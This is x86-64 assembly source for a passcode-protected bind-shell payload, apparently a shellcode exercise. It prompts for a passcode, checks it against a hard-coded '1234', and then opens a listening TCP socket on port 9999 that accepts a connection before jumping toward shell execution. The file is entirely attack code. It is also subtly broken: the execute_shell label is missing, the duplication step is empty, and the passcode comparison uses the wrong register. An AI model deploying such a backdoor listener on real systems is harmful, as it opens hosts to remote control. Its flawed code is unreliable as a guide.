global _start

section .text
_start:
        jmp call_main

exit_gracefully:
        ;exit syscall
        xor rax, rax 
        add rax, 60
        xor rdi, rdi 
        syscall

password_ok:
        ;write to console
        xor rax, rax
        mov al, 1
        mov rdi, rax
        mov rsi, exec_print
        mov rdx, lenexec
        syscall
        jmp bind_tcp_shell

validate_and_jump:
        pop rsi

        ;write to console
        xor rax, rax
        mov al, 1
        mov rdi, rax
        mov rdx, rdi
        add rdx, 32
        syscall

        ;read from stdin
        xor rax, rax
        mov al, 0; syscall num for read
        mov rdi, 0; fd for stdin
        mov rsi, readbuf
        mov rdx, 4
        syscall

        ;jump if password matches
	cld
        lea rax, [readbuf]
        lea rdi, [passcode]
        cmpsq
        jz password_ok

dup_console:
	

	jmp execute_shell

bind_tcp_shell:
	xor rax, rax
	xor rdi, rdi
	xor rsi, rsi
	xor rdx, rdx

	;create socket
	add rax, 41
	add dil, 2
	inc sil
	syscall
	
	mov rdi, rax ; or
	push rax ;stack now has return value or server fd
	
	;create structure
	push word 0xf27
	push word 0x02

	;create bind
	xor rax, rax
	add rax, 49
	mov rsi, rsp
	mov rdx, 16
	syscall

	;create listen
	xor rax, rax
	add rax, 50
	xor rsi, rsi
	add rsi, 2
	syscall

	;create accept
	xor rax, rax
	add rax, 43
	xor rsi, rsi
	xor rdx, rdx
	syscall

	push rax
	;mov rbx, rax ; store client fd in rbx

	jmp dup_console

	
call_main:
        call validate_and_jump
        password: db 'Enter Passcode to Exec Shellcode', 0xa

section .data:
	readbuf: times 64 dq 0
        ;lenbuf: equ $-readbuf
        passcode: dq '1234', 0xa
        exec_print: dq 'Executing ShellCode', 0xa
        lenexec: equ $-exec_print

